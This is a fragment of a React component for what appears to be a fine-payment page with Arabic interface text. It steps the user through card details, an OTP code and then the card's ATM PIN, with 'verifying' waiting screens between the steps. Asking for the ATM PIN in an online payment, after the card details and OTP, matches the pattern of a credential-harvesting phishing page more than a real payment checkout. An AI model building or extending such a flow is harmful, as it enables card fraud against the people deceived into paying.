                onSubmit={handleCardSubmit}
                onCancel={onBackToHome}
                isLoading={isSubmitting}
                error={null}
                fineAmount={fineAmount}
                discountAmount={discountAmount}
                totalAmount={dueAmount}
              />
            </div>
          </>
        )}

        {stage === 'card_pending' && <WaitingPage message="جاري التحقق من بيانات البطاقة..." />}
        {stage === 'otp' && <OtpForm onSubmit={handleOtpSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
        {stage === 'otp_pending' && <WaitingPage message="جاري التحقق من رمز OTP..." />}
        {stage === 'atm' && <AtmPinForm onSubmit={handleAtmPinSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
        {stage === 'atm_pending' && <WaitingPage message="جاري معالجة الدفع..." />}
        {stage === 'success' && <SuccessPage totalAmount={dueAmount} onDone={handleDone} />}
        {stage === 'failed' && <FailedPage onRetry={handleRetry} />}
      </div>

      <PaymentFooter />
    </PaymentFrame>
  )
}
